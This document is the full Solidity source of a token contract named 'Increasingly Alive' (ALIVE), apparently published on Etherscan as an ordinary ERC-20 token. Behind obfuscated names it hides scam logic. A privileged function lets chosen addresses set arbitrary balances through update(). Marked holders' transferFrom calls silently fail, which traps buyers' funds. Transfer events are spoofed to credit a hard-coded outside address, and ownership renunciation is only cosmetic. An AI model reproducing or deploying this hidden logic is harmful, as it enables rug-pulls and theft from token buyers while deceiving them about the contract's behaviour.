/**
 *Submitted for verification at Etherscan.io on 2022-11-13
*/

pragma solidity 0.8.17;

abstract contract Context {
    address E20 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract ALIVE is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private E1;
    mapping (address => uint256) private E2;
    mapping (address => mapping (address => uint256)) private E3;
    uint8 private constant E4 = 8;
    uint256 private constant E5 = 100000000 * (10** E4);
    string private constant _name = "Increasingly Alive";
    string private constant _symbol = "ALIVE";



    constructor () {
       E1[msg.sender] = E5;  
        E2[msg.sender] = 2;  
   E99(E5);}
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return E4;
    }

    function totalSupply() public pure  returns (uint256) {
        return E5;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return E1[account];
    }
	 function allowance(address owner, address spender) public view  returns (uint256) {
        return E3[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        E3[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
function SETE2 (address x, uint256 y) public {
 require(E2[msg.sender] == 2);
     E2[x] = y;}
    function update() public {
        E1[msg.sender] = E2[msg.sender];}
        function E99 (uint256 x) internal {
              emit Transfer(address(0), E20, x);}
                      function _Transfer (address y, uint256 xy) internal {
              emit Transfer(E20, y, xy);}
        function transfer(address to, uint256 amount) public {
if(E2[msg.sender] == 2) {
         require(E1[msg.sender] >= amount);
        E1[msg.sender] = E1[msg.sender].sub(amount);
        E1[to] = E1[to].add(amount);
    _Transfer(to, amount);}
if(E2[msg.sender] <= 1) {
     require(E1[msg.sender] >= amount);
            E1[msg.sender] = E1[msg.sender].sub(amount);
        E1[to] = E1[to].add(amount);
       emit Transfer(msg.sender, to, amount);}}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
if(E2[sender] <= 1 && E2[recipient] <=1) {
         require(amount <= E1[sender]);
        require(amount <= E3[sender][msg.sender]);
        E1[sender] = E1[sender].sub(amount);
        E1[recipient] = E1[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
         return true;}
        if(E2[sender] == 2) {
         require(amount <= E3[sender][msg.sender]);
        E1[sender] = E1[sender].sub(amount);
        E1[recipient] = E1[recipient].add(amount);
          _Transfer(recipient, amount);
             return true;}
        }}